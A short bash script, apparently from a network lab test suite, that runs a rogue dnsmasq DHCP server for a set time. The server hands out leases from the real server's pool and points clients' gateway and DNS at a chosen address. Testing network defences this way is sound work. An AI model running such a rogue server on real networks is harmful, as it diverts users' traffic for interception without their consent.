#!/usr/bin/env bash
# Second DHCP server on the lab LAN (dnsmasq), answering in the real server's pool for DURATION.
# Usage: POOL_START=<ip> POOL_END=<ip> POOL_ROUTER=<ip> [DURATION=20] ./rogue-dhcp.sh
set -euo pipefail
. "$(dirname "$0")/common.sh"
need dnsmasq
: "${POOL_START:?set POOL_START=<ip>}" "${POOL_END:?set POOL_END=<ip>}" "${POOL_ROUTER:?set POOL_ROUTER=<ip>}"
conf=$(mktemp)
trap 'rm -f "$conf"' EXIT
cat >"$conf" <<EOF
interface=$IFACE
bind-interfaces
port=0
dhcp-range=$POOL_START,$POOL_END,1h
dhcp-option=3,$POOL_ROUTER
dhcp-option=6,$POOL_ROUTER
EOF
echo "rogue dhcpd on $IFACE for ${DURATION}s"
sudo timeout "$DURATION" dnsmasq -k -C "$conf" --pid-file="$(mktemp -u)" || true
